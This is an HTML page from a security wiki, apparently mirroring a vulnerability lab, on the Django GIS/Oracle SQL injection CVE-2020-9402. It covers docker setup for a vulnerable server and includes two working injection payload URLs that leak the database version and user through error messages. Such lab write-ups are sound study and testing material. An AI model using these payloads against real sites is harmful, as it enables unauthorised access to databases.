<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Django/CVE-2020-9402/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402)", url: "#_top", children: [
              {title: "Environment Setup", url: "#environment-setup" },
              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Django GIS函数和聚合中因容差参数导致SQL注入漏洞（CVE-2020-9402）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2019-14234/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2019-14234/README.zh-cn/" class="btn btn-xs btn-link">
        Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）
      </a>
    </div>
    
  </div>

    

    <h1 id="django-gis-functions-and-aggregates-on-oracle-sql-injection-cve-2020-9402">Django GIS functions and aggregates on Oracle SQL Injection (CVE-2020-9402)<a class="headerlink" href="#django-gis-functions-and-aggregates-on-oracle-sql-injection-cve-2020-9402" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Django is a high-level Python web framework that encourages rapid development and clean, pragmatic design.</p>
<p>Django released a security update on March 4, 2020, which fixes a SQL injection vulnerability in the GIS functions and aggregates on Oracle. This vulnerability affects Django versions before 3.0.4, 2.2.11, and 1.11.29.</p>
<p>The vulnerability requires the developer to use GIS functions and aggregates, and the field name of the queryset can be controlled by the user. This vulnerability can be exploited through Django's built-in admin interface.</p>
<p>References:</p>
<ul>
<li><a href="https://www.djangoproject.com/weblog/2020/mar/04/security-releases/">https://www.djangoproject.com/weblog/2020/mar/04/security-releases/</a></li>
</ul>
<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
<p>Execute the following command to compile and start a vulnerable Django 3.0.3 server:</p>
<div class="highlight"><pre><span></span><code>docker compose build
docker compose up -d
</code></pre></div>
<p>After the server is started, you can access the Django home page at <code>http://your-ip:8000</code>.</p>
<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
<p>First, visit <code>http://your-ip:8000/vuln/</code>. You can inject SQL by adding malicious input to the <code>q</code> parameter:</p>
<div class="highlight"><pre><span></span><code>http://your-ip:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1
</code></pre></div>
<p>The SQL error message will be displayed, confirming the successful injection:</p>
<p><img alt="" src="1.png" /></p>
<p>Alternatively, you can visit <code>http://your-ip:8000/vuln2/</code> and inject SQL using a different payload:</p>
<div class="highlight"><pre><span></span><code>http://your-ip:8000/vuln2/?q=0.05))) FROM &quot;VULN_COLLECTION2&quot;  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --
</code></pre></div>
<p>The SQL error message will again confirm the successful injection:</p>
<p><img alt="" src="2.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Django GIS函数和聚合中因容差参数导致SQL注入漏洞（CVE-2020-9402）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2019-14234/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2019-14234/README.zh-cn/" class="btn btn-xs btn-link">
        Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>